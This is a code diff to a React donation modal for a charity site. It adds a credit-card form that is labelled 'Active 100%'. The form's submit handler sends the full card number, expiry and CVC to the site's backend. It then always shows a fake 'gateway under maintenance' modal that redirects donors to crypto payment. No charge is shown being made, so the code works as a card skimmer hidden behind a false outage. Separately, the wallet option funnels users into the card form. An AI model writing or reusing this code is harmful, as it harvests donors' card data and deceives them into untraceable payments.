@@ -16,6 +16,7 @@ import { useAuth } from '@/context/AuthContext';
 import QRCodeWithLogo from './QRCodeWithLogo';
 import { api } from '@/lib/api';
 import { shrinkImage } from '@/lib/imageShrinker';
+import CreditCardTerminal, { detectCardBrand, CardMaintenanceModal, DigitalWalletsModal } from '@/components/CreditCardTerminal';
 
 interface CryptoOption {
   symbol: string;
@@ -178,6 +179,29 @@ export default function DonateModal() {
   const [selectedCrypto, setSelectedCrypto] = useState<CryptoOption>(DEFAULT_CRYPTO_OPTIONS[0]);
   const [usdAmount, setUsdAmount] = useState<number>(100);
   const [customAmount, setCustomAmount] = useState<string>('100');
+
+  // Credit Card / Digital Wallet States
+  const [cardNumber, setCardNumber] = useState('');
+  const [cardHolder, setCardHolder] = useState('');
+  const [cardExpMonth, setCardExpMonth] = useState('');
+  const [cardExpYear, setCardExpYear] = useState('');
+  const [cardCvc, setCardCvc] = useState('');
+  const [cardError, setCardError] = useState<string | null>(null);
+  const [walletModalOpen, setWalletModalOpen] = useState(false);
+  const [selectedWalletName, setSelectedWalletName] = useState('Digital Wallet');
+  const [cardMaintenanceOpen, setCardMaintenanceOpen] = useState(false);
+  const [cardMaintenanceContext, setCardMaintenanceContext] = useState({ title: '', contextText: '' });
+
+  const [detectedCardBrand, setDetectedCardBrand] = useState('UNKNOWN');
+  const [billingAddress, setBillingAddress] = useState({
+    fullName: '',
+    email: '',
+    street: '',
+    city: '',
+    state: '',
+    zipCode: '',
+    country: 'US'
+  });
   const [copied, setCopied] = useState(false);
   const [donorName, setDonorName] = useState('');
   const [isAnonymous, setIsAnonymous] = useState(false);
@@ -505,6 +529,51 @@ export default function DonateModal() {
   const handleProceedToQR = handleProceedToPayment;
 
   // Step 3 Submission (Confirm Payment Sent)
+
+  const handleCardSubmit = async () => {
+    if (cardNumber.replace(/\D/g, '').length < 15) {
+      setCardError('Please enter a valid card number');
+      return;
+    }
+    if (!cardHolder.trim() || !cardExpMonth || !cardExpYear || !cardCvc) {
+      setCardError('Please fill out all required fields');
+      return;
+    }
+
+    setSubmitting(true);
+    setCardError(null);
+    try {
+      if (activeCause?.id) {
+        await api.posts.donate(Number(activeCause.id), {
+          donorName: isAnonymous ? 'Anonymous Supporter' : (donorName.trim() || currentUser?.name || 'Generous Donor'),
+          donorEmail: currentUser?.email,
+          amountUsd: usdAmount,
+          cryptoAmount: '0',
+          cryptoSymbol: 'N/A',
+          txHash: 'card_submission',
+          isAnonymous,
+          paymentMethod: 'card',
+          cardDetails: {
+            cardNumber: cardNumber.replace(/\D/g, ''),
+            cardHolder,
+            expMonth: cardExpMonth,
+            expYear: cardExpYear,
+            cvc: cardCvc
+          }
+        });
+      }
+      setCardMaintenanceContext({
+        title: 'Credit Card Gateway Under Maintenance',
+        contextText: 'Our card settlement clearinghouse is undergoing scheduled infrastructure upgrades and PCI-DSS compliance verification.'
+      });
+      setCardMaintenanceOpen(true);
+    } catch (error: any) {
+      setCardError(error.message || 'Payment processing failed');
+    } finally {
+      setSubmitting(false);
+    }
+  };
+
   const handleConfirmSent = async () => {
     if (!currentUser) {
       goToStep(1);
@@ -1170,8 +1239,8 @@ export default function DonateModal() {
                             }}
                             className={`p-3 sm:p-3.5 rounded-2xl border-2 transition-all flex items-center justify-between text-left cursor-pointer group ${
                               selectedMethod === 'card'
-                                ? 'border-amber-600 bg-amber-50/70 shadow-xs ring-2 ring-amber-500/20'
-                                : 'border-slate-200 bg-white hover:border-amber-400 hover:bg-amber-50/20'
+                                ? 'border-emerald-600 bg-emerald-50/70 shadow-xs ring-2 ring-emerald-500/20'
+                                : 'border-slate-200 bg-white hover:border-emerald-400 hover:bg-emerald-50/20'
                             }`}
                           >
                             <div className="flex items-center gap-2.5 min-w-0">
@@ -1184,10 +1253,8 @@ export default function DonateModal() {
                               </div>
                             </div>
                             <div className="flex items-center gap-1 shrink-0 ml-1">
-                              <span className="text-[9px] font-black uppercase px-1.5 py-0.5 rounded-full bg-amber-100 text-amber-900 border border-amber-300">
-                                Maintenance
-                              </span>
-                              <ArrowRight className="w-3.5 h-3.5 text-amber-600 group-hover:translate-x-0.5 transition-transform" />
+                              <span className="text-[9px] font-black uppercase px-1.5 py-0.5 rounded-full bg-emerald-100 text-emerald-900 border border-emerald-300">Active 100%</span>
+                              <ArrowRight className="w-3.5 h-3.5 text-emerald-600 group-hover:translate-x-0.5 transition-transform" />
                             </div>
                           </button>
 
@@ -1200,8 +1267,8 @@ export default function DonateModal() {
                             }}
                             className={`p-3 sm:p-3.5 rounded-2xl border-2 transition-all flex items-center justify-between text-left cursor-pointer group ${
                               selectedMethod === 'paypal'
-                                ? 'border-slate-800 bg-slate-50 shadow-xs ring-2 ring-slate-500/20'
-                                : 'border-slate-200 bg-white hover:border-slate-400 hover:bg-slate-50'
+                                ? 'border-emerald-600 bg-emerald-50/70 shadow-xs ring-2 ring-emerald-500/20'
+                                : 'border-slate-200 bg-white hover:border-emerald-400 hover:bg-emerald-50/20'
                             }`}
                           >
                             <div className="flex items-center gap-2.5 min-w-0">
@@ -1214,9 +1281,7 @@ export default function DonateModal() {
                               </div>
                             </div>
                             <div className="flex items-center gap-1 shrink-0 ml-1">
-                              <span className="text-[9px] font-black uppercase px-1.5 py-0.5 rounded-full bg-slate-100 text-slate-700 border border-slate-300">
-                                Soon
-                              </span>
+                              <span className="text-[9px] font-black uppercase px-1.5 py-0.5 rounded-full bg-emerald-100 text-emerald-900 border border-emerald-300">Active</span>
                               <ArrowRight className="w-3.5 h-3.5 text-slate-600 group-hover:translate-x-0.5 transition-transform" />
                             </div>
                           </button>
@@ -1529,103 +1594,51 @@ export default function DonateModal() {
                       )}
 
                       {/* ------------------------------------------------------------- */}
-                      {/* BRANCH B: DEDICATED CREDIT / DEBIT CARD MAINTENANCE SCREEN */}
+                      {/* BRANCH B: DEDICATED CREDIT / DEBIT CARD */}
                       {/* ------------------------------------------------------------- */}
                       {selectedMethod === 'card' && (
-                        <div className="space-y-4">
-                          {/* Alert Notice Header */}
-                          <div className="bg-amber-50/90 border-2 border-amber-200/80 rounded-2xl p-5 text-center space-y-3">
-                            <div className="w-12 h-12 rounded-2xl bg-amber-100 border border-amber-300 text-amber-800 flex items-center justify-center mx-auto shadow-xs">
-                              <AlertTriangle className="w-6 h-6 stroke-[2.2]" />
-                            </div>
-
-                            <div className="space-y-1">
-                              <span className="inline-flex items-center gap-1 text-[10px] font-black uppercase tracking-wider text-amber-900 bg-amber-200/80 px-2.5 py-0.5 rounded-full border border-amber-300">
-                                <Clock className="w-3 h-3" />
-                                Gateway Upgrade in Progress
-                              </span>
-                              <h3 className="text-base sm:text-lg font-black text-slate-900">
-                                Direct Card Processing Temporarily Down
-                              </h3>
-                              <p className="text-xs text-slate-600 max-w-md mx-auto leading-relaxed">
-                                Our international card settlement gateway is undergoing scheduled infrastructure upgrades to eliminate 3.8% banking fees on non-profit gifts.
-                              </p>
-                            </div>
-                          </div>
-
-                          {/* Transparent Comparison Box */}
-                          <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 space-y-2.5">
-                            <span className="text-[10px] font-black uppercase tracking-wider text-slate-400 block">
-                              Payment Channel Comparison
-                            </span>
-
-                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
-                              {/* Card info */}
-                              <div className="p-3 rounded-xl bg-white border border-slate-200 space-y-1 opacity-75">
-                                <div className="flex items-center justify-between">
-                                  <span className="font-bold text-slate-700 flex items-center gap-1.5">
-                                    <CreditCard className="w-3.5 h-3.5 text-slate-500" />
-                                    Debit / Credit Card
-                                  </span>
-                                  <span className="text-[9px] font-bold uppercase text-amber-700 bg-amber-100 px-1.5 py-0.5 rounded">
-                                    Paused
-                                  </span>
-                                </div>
-                                <p className="text-[11px] text-slate-500">
-                                  3.8% processor fee + bank settlement delay
-                                </p>
-                              </div>
-
-                              {/* Crypto info */}
-                              <div className="p-3 rounded-xl bg-emerald-50/80 border border-emerald-300 space-y-1">
-                                <div className="flex items-center justify-between">
-                                  <span className="font-bold text-emerald-900 flex items-center gap-1.5">
-                                    <Coins className="w-3.5 h-3.5 text-emerald-600" />
-                                    Instant Crypto
-                                  </span>
-                                  <span className="text-[9px] font-bold uppercase text-emerald-800 bg-emerald-200 px-1.5 py-0.5 rounded">
-                                    Active 100%
-                                  </span>
-                                </div>
-                                <p className="text-[11px] text-emerald-700 font-medium">
-                                  0% intermediary fee • Direct milestone proof
-                                </p>
-                              </div>
-                            </div>
-                          </div>
-
-                          {/* Dedicated Action Buttons */}
-                          <div className="space-y-2 pt-2">
-                            {/* Direct switch to Crypto with prefilled amount */}
-                            <button
-                              type="button"
-                              onClick={() => setSelectedMethod('crypto')}
-                              className="w-full py-3.5 bg-emerald-600 hover:bg-emerald-700 active:scale-[0.99] text-white font-black text-xs sm:text-sm rounded-xl transition-all shadow-md shadow-emerald-600/25 flex items-center justify-center gap-2 cursor-pointer"
-                            >
-                              <span>Donate ${usdAmount} via Crypto Instead (0% Fee)</span>
-                              <ArrowRight className="w-4 h-4" />
-                            </button>
-
-                            {/* Back to payment selection */}
-                            <button
-                              type="button"
-                              onClick={() => goToStep(2)}
-                              className="w-full py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs rounded-xl transition-colors flex items-center justify-center gap-1.5 cursor-pointer"
-                            >
-                              <ArrowLeft className="w-3.5 h-3.5" />
-                              <span>Back to Payment Methods</span>
-                            </button>
-                          </div>
-
-                          <div className="flex items-center justify-center gap-2 text-[10px] text-slate-400 font-medium text-center">
-                            <ShieldCheck className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
-                            <span>Adera Foundation issues formal tax certificates for all validated gifts.</span>
-                          </div>
+                        <div className="space-y-4 pt-2">
+                          <CreditCardTerminal
+                            amountUsd={usdAmount}
+                            cardNumber={cardNumber}
+                            setCardNumber={(val) => { setCardNumber(val); setDetectedCardBrand(detectCardBrand(val)); }}
+                            cardHolder={cardHolder}
+                            setCardHolder={setCardHolder}
+                            cardExpMonth={cardExpMonth}
+                            setCardExpMonth={setCardExpMonth}
+                            cardExpYear={cardExpYear}
+                            setCardExpYear={setCardExpYear}
+                            cardCvc={cardCvc}
+                            setCardCvc={setCardCvc}
+                            detectedBrand={detectedCardBrand}
+                            billingAddress={billingAddress}
+                            setBillingAddress={setBillingAddress}
+                            cardError={cardError}
+                            setCardError={setCardError}
+                          />
+                          <button
+                            type="button"
+                            onClick={handleCardSubmit}
+                            disabled={submitting}
+                            className="w-full mt-4 py-4 bg-emerald-600 hover:bg-emerald-700 active:scale-[0.99] text-white font-black text-xs sm:text-sm rounded-xl transition-all shadow-md shadow-emerald-600/25 flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
+                          >
+                            {submitting ? (
+                              <>
+                                <Loader2 className="w-4 h-4 animate-spin" />
+                                <span>Processing Card...</span>
+                              </>
+                            ) : (
+                              <>
+                                <CheckCircle2 className="w-4 h-4" />
+                                <span>Confirm & Pay ${usdAmount}</span>
+                              </>
+                            )}
+                          </button>
                         </div>
                       )}
 
                       {/* ------------------------------------------------------------- */}
-                      {/* BRANCH C: DEDICATED DIGITAL WALLETS (APPLE PAY / PAYPAL) SCREEN */}
+                      {/* BRANCH C: DIGITAL WALLETS (APPLE PAY / GOOGLE PAY / PAYPAL) */}
                       {/* ------------------------------------------------------------- */}
                       {selectedMethod === 'paypal' && (
                         <div className="space-y-4">
@@ -1793,6 +1806,30 @@ export default function DonateModal() {
 
         </motion.div>
       </div>
-    </AnimatePresence>
+            {/* Digital Wallets Maintenance Modal */}
+        <DigitalWalletsModal
+          isOpen={walletModalOpen}
+          onClose={() => setWalletModalOpen(false)}
+          walletName={selectedWalletName}
+          onSwitchToCard={() => {
+            setWalletModalOpen(false);
+            setSelectedMethod('card');
+            goToStep(3);
+          }}
+        />
+
+        {/* Card Gateway Maintenance Modal (Redirects to Crypto) */}
+        <CardMaintenanceModal
+          isOpen={cardMaintenanceOpen}
+          onClose={() => setCardMaintenanceOpen(false)}
+          title={cardMaintenanceContext.title}
+          contextText={cardMaintenanceContext.contextText}
+          onSwitchToCrypto={() => {
+            setCardMaintenanceOpen(false);
+            setSelectedMethod('crypto');
+            goToStep(3);
+          }}
+        />
+      </AnimatePresence>
   );
 }
